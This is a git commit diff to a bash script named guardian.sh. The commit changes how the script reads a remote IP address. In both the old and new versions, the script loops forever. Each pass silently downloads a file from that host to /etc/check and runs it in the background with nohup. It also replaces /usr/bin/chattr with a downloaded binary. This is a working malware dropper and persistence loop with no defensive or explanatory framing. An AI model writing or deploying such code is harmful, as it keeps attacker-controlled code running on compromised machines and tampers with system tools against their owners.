78d9dbf679c824e3bd430f307713b764e2d10703
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-05-26 14:41:16 +0100

    Update guardian.sh

--- guardian.sh
+++ guardian.sh
@@ -2,36 +2,29 @@
 #H3X-007 :)
 
 script_path="/etc/check"
-HOST="/etc/host"
-ip_address="$1"
 
-if [ -z "$ip_address" ]; then
-    exit 1
-fi
-
-# Save the IP address to a file for future use
-echo "$ip_address" > "$HOST"
+ip_address=$(head -n 1 "/etc/HOST")
 
 while true; do
     if [ ! -f "$script_path" ]; then
-        wget "http://$HOST/check.sh" -O "$script_path" >/dev/null 2>&1
+        wget "http://$ip_address/check" -O "$script_path" >/dev/null 2>&1
         chmod +x "$script_path"
     else
-        cp "$script_path" "/tmp/check.sh" >/dev/null 2>&1
-        wget "http://$HOST/check.sh" -O "$script_path" >/dev/null 2>&1
+        cp "$script_path" "/tmp/check" >/dev/null 2>&1
+        wget "http://$ip_address/check" -O "$script_path" >/dev/null 2>&1
         chmod +x "$script_path"
-        cp "/tmp/check.sh" "$script_path" >/dev/null 2>&1
-        rm "/tmp/check.sh" >/dev/null 2>&1
+        cp "/tmp/check" "$script_path" >/dev/null 2>&1
+        rm "/tmp/check" >/dev/null 2>&1
     fi
 
     chattr_path="/usr/bin/chattr"
 
     if [ ! -f "$chattr_path" ]; then
-        wget "http://$HOST/chattr" -O "$chattr_path" >/dev/null 2>&1
+        wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
         chmod +x "$chattr_path"
     else
         cp "$chattr_path" "/tmp/chattr" >/dev/null 2>&1
-        wget "http://$HOST/chattr" -O "$chattr_path" >/dev/null 2>&1
+        wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
         chmod +x "$chattr_path"
         cp "/tmp/chattr" "$chattr_path" >/dev/null 2>&1
         rm "/tmp/chattr" >/dev/null 2>&1
@@ -39,6 +32,5 @@ while true; do
 
     nohup "$script_path" >/dev/null 2>&1 &
 
-    
     sleep 1
 done
